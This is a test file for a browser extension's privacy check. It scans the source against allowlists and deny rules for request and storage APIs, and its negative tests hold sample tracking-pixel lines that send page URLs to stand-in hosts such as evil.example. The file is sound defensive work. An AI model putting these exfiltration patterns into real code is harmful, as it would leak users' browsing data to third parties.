import { fileURLToPath } from 'node:url';
import { describe, expect, it } from 'vitest';
import type { Rules } from './surface.js';
import { givenTo, modulesIn, surfaceOf, why } from './surface.js';

const src = fileURLToPath(new URL('../src', import.meta.url));

/**
 * Every name this package uses and does not bind: the whole of what it can
 * reach outside itself.
 *
 * An allowlist rather than a list of names to refuse, and that is the point of
 * it. `fetch` is one way to send a page somewhere; `XMLHttpRequest`,
 * `WebSocket`, `EventSource`, `navigator.sendBeacon`, an `Image` whose `src`
 * is set, and `importScripts` are six more, and so is whatever the next
 * platform release calls the seventh. A list of the ones to refuse is a list
 * someone has to keep complete against a platform nobody here owns. This one
 * refuses everything not named, so a way out cannot arrive by being
 * forgotten. Adding a name is the deliberate act.
 *
 * Fourteen names is the whole of the outside world this package sees, and they
 * group into four things.
 *
 * `chrome` is the two extension calls `dormant.test.ts` allowlists. `document`
 * is the page both injected functions work in.
 *
 * `innerWidth`, `innerHeight`, `devicePixelRatio`, `matchMedia` and
 * `getComputedStyle` are the browser the page is being looked at in, and they
 * are why this list grew from four: the panel now explains a live render, and
 * a render is a viewport, a ratio, the `<source>` a `media` condition picked
 * and the backgrounds this viewport painted. Every one of them is a read. None
 * of them can name a destination, which is what makes them safe to allow and
 * what the shorter list below still refuses.
 *
 * `Element`, `HTMLImageElement` and `HTMLSourceElement` are types and nothing
 * else — erased before `tsc` emits a line — and they are how the reader says
 * what it is reading. `undefined` is what a tab without an id is compared
 * against, and `Promise` is the return type of `executeScript`.
 *
 * `Math` and `URL` are the worker's two, and they are the two worth an
 * argument. `Math.round` is presentation: core returns exact numbers and a
 * panel shows whole pixels. `URL` parses, and parsing is the opposite of
 * fetching — it is what makes a relative candidate comparable with an absolute
 * `currentSrc`, which is the comparison the whole cache-honesty requirement
 * rests on. Neither reaches the network, and `DESTINATIONS` below is what says
 * no string in this package could give either of them somewhere to go.
 */
const GLOBALS = new Set([
  'Element',
  'HTMLImageElement',
  'HTMLSourceElement',
  'Math',
  'Promise',
  'URL',
  'chrome',
  'devicePixelRatio',
  'document',
  'getComputedStyle',
  'innerHeight',
  'innerWidth',
  'matchMedia',
  'undefined',
]);

/**
 * Every property this package calls.
 *
 * The same allowlist, at the one place a global cannot be the route out.
 * `navigator.sendBeacon(url, data)` names no refused global — `navigator` is
 * as innocent as it gets — and `caches.open` or `chrome.storage.local.set`
 * would name none either if their objects were ever allowed.
 *
 * Twenty-eight names, and the list is longer than it was because the panel says
 * more than it did. It still groups into four things and nothing else.
 *
 * The extension's own work: register, inject, and swallow the one rejection an
 * injection can produce — `addListener`, `executeScript`, `then`, `catch`.
 * `catch` is here because saying nothing has to be said out loud, and
 * `background.ts` explains why.
 *
 * Building the panel: `createElement`, `attachShadow`, `appendChild`,
 * `getElementById`, `remove`.
 *
 * Reading the page: `closest`, `getAttribute`, `getBoundingClientRect`,
 * `querySelectorAll`. Four reads, no writes — nothing in this package changes
 * a page it was injected into, which is not something an allowlist of calls
 * can say on its own and is exactly what `WRITTEN` below says.
 *
 * Lists, strings and one rounding: `filter`, `map`, `join`, `includes`,
 * `indexOf`, `slice`, `startsWith`, `toLowerCase`, `unshift`, `round`. Not one
 * of them can reach anything, which is why a list this long still holds: the
 * question a call allowlist answers is whether a name that leaves the machine
 * got in, and the rules below refuse those by name whatever this list has
 * grown to.
 *
 * `startsWith` asks the one question that separates a path from a `data:`
 * payload: whether it opens with a slash. `split` and `test` are how the name
 * beside a row's headline is found once it is a path — the segments, and
 * whether one ends in an extension — and they are safe for the same reason the
 * rest of this group is: a segment of a URL the page already loaded is not a
 * destination, and nothing here can make one of it. The whole URL is still
 * shown, two openings down, so nothing is lost to the shortening.
 * `toUpperCase` capitalises the first letter of a sentence that otherwise
 * follows a dash.
 *
 * `addEventListener` and `scrollIntoView` are the pointing half, and they are
 * the two entries that read like a reach into the page. Neither is.
 * `addEventListener` is only ever called on a node the panel made inside its
 * own closed root — `pointing.test.ts` walks the page and finds none — so it
 * registers nothing that outlives the host's removal, and `dormant.test.ts`
 * refuses the event names that would fire without a click.
 * `scrollIntoView` is the one thing on this list that reaches a page element,
 * and it changes the page's scroll offset and nothing else: no style, no
 * class, no attribute. The issue asks for it in those words — "clicking a row
 * brings that image into view" — so it is a sanctioned change rather than a
 * tolerated one.
 */
const CALLED = new Set([
  'addEventListener',
  'addListener',
  'appendChild',
  'attachShadow',
  'catch',
  'closest',
  'createElement',
  'executeScript',
  'filter',
  'getAttribute',
  'getBoundingClientRect',
  'getElementById',
  'includes',
  'indexOf',
  'join',
  'map',
  'querySelectorAll',
  'remove',
  'round',
  'scrollIntoView',
  'slice',
  'split',
  'startsWith',
  'test',
  'then',
  'toLowerCase',
  'toUpperCase',
  'unshift',
]);

/**
 * Every property this package writes to.
 *
 * The tightest of the three lists and the one that matters most, because
 * writing a property is how the panel would leak a page without ever calling
 * anything: `img.src = 'https://…/?' + location.href` is a request, made by
 * assignment, with no name any list of dangerous APIs would hold.
 *
 * It was two names for two slices — the host's id and the words it says — and
 * it is seven now, because the panel draws a thumbnail, holds disclosures, and
 * leads every row with a verdict. Each is written on an element the panel made
 * and nowhere else, and the new ones divide sharply:
 *
 * `alt`, `title` and `open` carry text and a boolean. None of them can name a
 * destination in any browser: an `alt` is read aloud, a `title` is a tooltip,
 * an `open` is a disclosure's state. They are here because the panel says what
 * a thumbnail shows where it will not draw, what the cache mark means where
 * the mark is, and that the card starts open — and every one of those is
 * something the platform's own element does with no class name and no script.
 *
 * `className` is the verdict's tone, and it is the one class in the panel. It
 * takes one of three words the extension owns — `good`, `warn`, `quiet` — and
 * never a page string, and `panel.test.ts` holds the stylesheet to exactly
 * those three. It is here because a tone is a state and not a kind of element,
 * so no tag name can carry it, and a reader has to be able to find the
 * warnings in a column of rows before reading any of them.
 *
 * `src` is the one that is a request, and it is the reason `WHOLE` below
 * exists. It is not allowed here as a name a contributor may write freely: the
 * only value it may take is a whole value that arrived from the reading, which
 * is a claim about the assignment rather than about the property, and it is
 * checked as one.
 *
 * `innerHTML` is still refused, by absence here and by name in
 * `escaping.test.ts`.
 */
const WRITTEN = new Set(['alt', 'className', 'id', 'open', 'src', 'textContent', 'title']);

/**
 * Properties whose value may only ever be a whole value read off something.
 *
 * The narrowing, written down. `src` used to be refused outright, on the
 * argument that an assignment is the leak no denylist of API names catches:
 * `pixel.src = 'https://evil.example/p?' + location.href` calls nothing, names
 * nothing dangerous, and hands a third party the address of the page a reader
 * was looking at. That argument is untouched. What changed is that a panel
 * whose whole job is "which image is this row about" is far better at it with
 * the image in the row, and the maintainer asked for one.
 *
 * So the refusal changed shape instead of going away. A `src` may be written,
 * and the only thing it may be written is a value the code did not build: an
 * identifier, or one property read off something. That is what a leak cannot
 * be. Every route out needs a URL with a fact stitched into it — a
 * concatenation, a template literal, an interpolated `location.href`, a query
 * appended to a real candidate — and every one of those is an expression this
 * check can see is not a plain read.
 *
 * What survives, stated as plainly as it can be: the thumbnail asks for a file
 * the page has already asked for, from a host the page has already contacted,
 * so nothing reaches anywhere it had not already reached. And because the
 * value is whole, no fact about the page — its URL, its base, its title, which
 * images it has — can be encoded into the request. The chain is two links long
 * and the test below names both: `read.ts` takes `currentSrc` off the page's
 * own image, `explain.ts` carries it as `file`, and `panel.ts` assigns
 * `row.file`. Nothing in the middle touches it.
 *
 * The check reads the shape of one expression, so a value laundered through a
 * function call — `pixel.src = leak(what)` — is a read of `leak(what)` and not
 * a plain one, which it refuses. A value laundered through a variable is the
 * hole: `const url = base + what; pixel.src = url` is a plain identifier. The
 * allowlists above are what narrow that — `location` is not a name this
 * package may reach, and `DESTINATIONS` refuses the string half.
 */
const WHOLE: Rules = [
  [/^src$/, 'a src is only ever a whole URL that arrived from the reading'],
];

/**
 * Names refused by name as well as by absence from the allowlists above.
 *
 * Short on purpose. The allowlists above already refuse everything they do not
 * name, so a long catalogue of dangerous APIs would be guarding code that
 * cannot exist while every name this package reaches for is written out above.
 * What these rules
 * are for is the edit that widens an allowlist — a contributor who allowed one
 * name because the call in front of them seemed harmless — so each names the
 * route rather than every spelling of it, and the failing line says which list
 * stopped it.
 *
 * `src` left the third rule and did not leave the file: `WHOLE` above is where
 * it went, and it is refused there on the shape of what it is given rather
 * than on its name. Its four siblings stay refused outright, because the panel
 * has no thumbnail's worth of reason to write any of them.
 */
const LEAKS: Rules = [
  [/^(?:fetch|XMLHttpRequest|WebSocket|sendBeacon)$/, 'a way to make a request'],
  [/^(?:localStorage|sessionStorage|indexedDB|setItem)$/, 'a place to keep page data'],
  [/^(?:srcset|href|action|poster)$/, 'a request made by assignment'],
];

/** The one path off `chrome` that would keep something. */
const KEEPS: Rules = [[/^chrome\.storage\b/, 'the only place the extension could keep anything']];

/**
 * Every shape a destination takes as text.
 *
 * A name allowlist alone would miss the half of a request that is not an API:
 * a URL has to be written down somewhere, and a string is where. It is also
 * what covers the routes no reading of names can see at all — an `@import`, a
 * `url()` in a stylesheet — because both of them carry one of these, and the
 * panel ships a stylesheet.
 */
const DESTINATIONS: Rules = [
  [/\b[a-z][a-z0-9+.-]*:\/\//i, 'a URL'],
  [/^\/\//, 'a protocol-relative URL'],
  [/^(?:data|blob|javascript):/i, 'a URL that carries its own content'],
  [/@import|url\(/i, 'a stylesheet that loads something'],
];

/** One name, refused by either list or allowed by both. */
const refused = (kind: string, name: string, allowed: Set<string>, rules: Rules): string | null => {
  const reason = why(rules, name);
  if (reason !== undefined) return `${kind} ${name}, which is ${reason}`;
  return allowed.has(name) ? null : `${kind} ${name}`;
};

/**
 * Every way one module could store something or send it somewhere, one line
 * each. Empty is clean.
 */
function findings(text: string): string[] {
  const surface = surfaceOf(text);
  const found = [
    ...surface.refused,
    ...WHOLE.flatMap(([pattern, reason]) =>
      [...WRITTEN]
        .filter((name) => pattern.test(name))
        .flatMap((name) =>
          givenTo(text, name)
            .filter((given) => !given.whole)
            .map((given) => `gives ${name} the value ${given.wrote}, and ${reason}`),
        ),
    ),
    ...surface.globals.map((name) => refused('reaches', name, GLOBALS, LEAKS)),
    ...surface.called.map((name) => refused('calls', name, CALLED, LEAKS)),
    ...surface.written.map((name) => refused('writes', name, WRITTEN, LEAKS)),
    ...surface.chrome.map((path) => {
      const reason = why(KEEPS, path);
      return reason === undefined ? null : `names ${path}, which is ${reason}`;
    }),
    ...surface.strings.map((value) => {
      const reason = why(DESTINATIONS, value);
      return reason === undefined ? null : `writes a string naming ${reason}`;
    }),
  ];
  return [...new Set(found.filter((line): line is string => line !== null))];
}

/**
 * The design's privacy constraint, as a check rather than as a promise:
 *
 * > The project collects nothing. This is a constraint on the design, not a
 * > policy page.
 * >
 * > […] The extension holds `activeTab` only. It stores no page data and sends
 * > nothing anywhere.
 *
 * Neither half of that last sentence can be observed from a running extension.
 * An extension that stores nothing and one that stores everything look
 * identical from a page, and an extension that phones home looks identical to
 * one that does not until somebody thinks to watch the network on the right
 * page at the right moment. A reviewer reading `chrome://extensions` sees a
 * permission list, which is a claim about what is possible rather than about
 * what happens.
 *
 * So the source is read. `manifest.test.ts` holds the permission half, which
 * is what makes a remote host unreachable in the first place; this holds the
 * half that is about code, which matters because `activeTab` does not stop a
 * page's own origin from being a destination — an injected panel can `fetch`
 * anywhere the page can.
 *
 * There is no storage in this package for the same reason there is no cache in
 * it: the panel's only state is whether the panel is in the page, and the page
 * is the thing that knows that. `panel.test.ts` holds that as behaviour, and
 * names the one thing it costs.
 *
 * ## What still gets past
 *
 * - **A destination the code only has when it runs.** `'htt' + 'ps://…'`
 *   names nothing this reading can see. The allowlists are what narrow it: a
 *   string has to reach an API to become a request, and every API this package
 *   may name is written out above.
 * - **A property named at run time.** `el[field] = value` is refused rather
 *   than read, which is why `surfaceOf` reports it as a refusal.
 * - **A module reached at run time.** `boundary.test.ts` refuses a computed
 *   `import()` for the whole package, which is the backstop.
 */
describe('the extension, checked against storing or sending anything', () => {
  const modules = modulesIn(src);

  it('has sources to check, so nothing below passes for want of a file', () => {
    expect(Object.keys(modules).sort()).toEqual([
      'background.ts',
      'chrome.d.ts',
      'explain.ts',
      'panel.ts',
      'read.ts',
    ]);
    // The check reads the modules it meant to read, rather than passing on
    // renamed files whose surface happens to be empty.
    expect(surfaceOf(modules['panel.ts'] ?? '').globals).toContain('document');
    expect(surfaceOf(modules['read.ts'] ?? '').globals).toContain('matchMedia');
  });

  it('reaches fourteen names outside itself, and no others', () => {
    const reached = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).globals));

    expect([...reached].sort()).toEqual([...GLOBALS].sort());
  });

  it('calls twenty-eight properties, and no others', () => {
    const calls = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).called));

    expect([...calls].sort()).toEqual([...CALLED].sort());
  });

  it('writes seven properties, and no others', () => {
    const writes = new Set(Object.values(modules).flatMap((text) => surfaceOf(text).written));

    expect([...writes].sort()).toEqual([...WRITTEN].sort());
  });

  it('assigns a src once, and assigns it a whole value off the row', () => {
    // The narrowing, pinned as a chain rather than as a rule about intent.
    // `read.ts` takes `currentSrc` off the page's own image, `explain.ts`
    // carries it under `file`, `panel.ts` gives it to the thumbnail — and every
    // link is a plain read, so there is nowhere along it for a fact about the
    // page to be stitched in. Asserted by the text of each expression, because
    // "whole" is a shape and the shape is the guarantee.
    const given = Object.entries(modules).flatMap(([name, text]) =>
      givenTo(text, 'src').map((one) => `${name} gives src ${one.wrote}, whole: ${one.whole}`),
    );

    expect(given).toEqual(['panel.ts gives src row.file, whole: true']);
    expect(givenTo(modules['explain.ts'] ?? '', 'file')).toEqual([
      { wrote: 'image.currentSrc', whole: true },
    ]);
    expect(givenTo(modules['explain.ts'] ?? '', 'currentSrc')).toEqual([
      { wrote: 'raw.currentSrc', whole: true },
    ]);
    // The first link, and the one place the chain is not a single read: the
    // reader falls back from the file the browser chose to the `src` the page
    // wrote. Both halves are reads off the same element and nothing is built
    // out of them, which is the property — a fallback between two of the
    // page's own values cannot carry a fact the page did not already have.
    expect(givenTo(modules['read.ts'] ?? '', 'currentSrc')).toEqual([
      { wrote: 'img.currentSrc || img.src', whole: false },
    ]);
  });

  it('names no destination anywhere, in a string or otherwise', () => {
    const found = Object.entries(modules).flatMap(([name, text]) =>
      surfaceOf(text)
        .strings.filter((value) => why(DESTINATIONS, value) !== undefined)
        .map((value) => `${name} writes "${value}"`),
    );

    expect(found).toEqual([]);
  });

  it('stores no page data and sends none anywhere, by the whole reading', () => {
    const found = Object.entries(modules).flatMap(([name, text]) =>
      findings(text).map((line) => `${name} ${line}`),
    );

    expect(found).toEqual([]);
  });
});

describe('the privacy check, given an extension that keeps or sends something', () => {
  it('catches a leak made by assignment, which no list of dangerous calls holds', () => {
    // The case that earns its keep. Everything else a panel could do to send a
    // page somewhere goes through a name — `fetch`, `sendBeacon`, a socket —
    // and the allowlist above refuses all of them by absence. This one calls
    // nothing: it builds an element the page never sees, writes a URL into a
    // property, and the browser makes the request on its behalf.
    //
    // It used to be caught by `src` being refused outright. It is caught now
    // by the shape of what `src` was given — a concatenation is not a whole
    // value that arrived from the reading — which is the narrowing the
    // thumbnail cost and the whole of what it cost.
    expect(
      findings(
        [
          'export const send = (what: string) => {',
          '  const pixel = document.createElement("img");',
          '  pixel.src = "https://imgwhy.example/p?" + what;',
          '};',
        ].join('\n'),
      ),
    ).toEqual([
      'gives src the value "https://imgwhy.example/p?" + what, and a src is only ever a whole ' +
        'URL that arrived from the reading',
      'writes a string naming a URL',
    ]);
  });

  /**
   * Every way a leak could be dressed as a thumbnail.
   *
   * Held here rather than tried on a branch and reverted, so the failure each
   * one should cause is a passing test instead of a note in a commit message.
   * Every entry is a `src` a panel may legitimately want to write and may not:
   * the value is one it built, and a value the code built is a value a fact
   * about the page can be stitched into. The last is the sharpest — it starts
   * from a real candidate URL the reading did hand over, which is exactly the
   * edit somebody would make believing it stayed within the rule.
   */
  const dressed: [string, string, string][] = [
    [
      'a concatenation onto a URL the code wrote',
      'thumb.src = "https://evil.example/p?" + row.file;',
      '"https://evil.example/p?" + row.file',
    ],
    [
      'a template literal, which is a concatenation with nicer punctuation',
      'thumb.src = `${row.file}?from=${where}`;',
      '`${row.file}?from=${where}`',
    ],
    [
      'the page’s own address interpolated into a real host',
      'thumb.src = `https://cdn.example.net/t?at=${location.href}`;',
      '`https://cdn.example.net/t?at=${location.href}`',
    ],
    [
      'a query appended to a candidate the reading did hand over',
      'thumb.src = row.file + "?ref=" + document.URL;',
      'row.file + "?ref=" + document.URL',
    ],
    [
      'a value laundered through a call, which is not a read of anything',
      'thumb.src = shrink(row.file);',
      'shrink(row.file)',
    ],
    [
      'a compound assignment, which builds on what was already there',
      'thumb.src += row.file;',
      'row.file',
    ],
  ];

  it.each(dressed)('catches %s', (_route, line, wrote) => {
    const [given] = givenTo(`export const draw = (thumb, row) => { ${line} };`, 'src');

    expect(given).toEqual({ wrote, whole: false });
    expect(findings(`export const draw = (thumb, row) => { ${line} };`)).toContain(
      `gives src the value ${wrote}, and a src is only ever a whole URL that arrived from the ` +
        'reading',
    );
  });

  it('is quiet about the one assignment the panel makes', () => {
    // The shipped line, read by the same check. A whole value off the row is
    // the only thing that passes, and it is what the panel writes.
    expect(givenTo('export const draw = (thumb, row) => { thumb.src = row.file; };', 'src')).toEqual(
      [{ wrote: 'row.file', whole: true }],
    );
    expect(findings('export const draw = (thumb, row) => { thumb.src = row.file; };')).toEqual([]);
  });

  it('reads a src written around the dot, which a check on one spelling would miss', () => {
    expect(
      givenTo('export const draw = (thumb, row) => { thumb["src"] = row.file + "?x"; };', 'src'),
    ).toEqual([{ wrote: 'row.file + "?x"', whole: false }]);
  });

  it('refuses a way out even where an allowlist has been loosened', () => {
    // What `LEAKS` is for, and the only way to show it: the shipped package
    // reaches none of it, so nothing about the checks above would change if it
    // were deleted. The edit it exists for is one to `GLOBALS` — a contributor
    // who allowed a name because the one call in front of them seemed
    // harmless — and this is the list that does not move with it.
    const loosened = new Set([...GLOBALS, 'fetch']);

    expect(refused('reaches', 'fetch', loosened, LEAKS)).toBe(
      'reaches fetch, which is a way to make a request',
    );
    expect(refused('reaches', 'document', loosened, LEAKS)).toBeNull();
  });

  it('reads a type parameter as a name the module binds, not as one it reaches for', () => {
    // `chrome.d.ts` declares `executeScript` with two of them, because the
    // result it returns is whatever the function it injected returned. Left
    // unbound, both arrived in `globals` — so `Result` would have had to go in
    // the allowlist of the outside world, beside `document`, where it means
    // nothing at all and where the next reader would have to work out that it
    // is not a global.
    const declared = 'export const of = <Held>(one: Held): Held[] => [one];';

    expect(surfaceOf(declared).globals).toEqual([]);
    // And a name that is not declared is still reached, which is what says the
    // line above binds one rather than dropping every type reference.
    expect(surfaceOf('export const of = (one: Held): Held[] => [one];').globals).toEqual(['Held']);
  });

  it('binds a type parameter inside its own declaration and nowhere else', () => {
    // The other half of the line above, and the half that matters here: this
    // list is the only thing standing between the package and a global it may
    // not reach, so a name that leaves it by accident is a name nothing
    // refuses. A type parameter is scoped to the declaration that introduces
    // it — every other binding this reading collects is a module-level one —
    // and putting one in the same flat set lets a `<Held>` on one line mask a
    // reach for `Held` on another.
    const masked = [
      'export const of = <Held>(one: Held): Held[] => [one];',
      'export const send = (what: string) => Held.reach(what);',
    ].join('\n');

    expect(surfaceOf(masked).globals).toEqual(['Held']);
  });
});
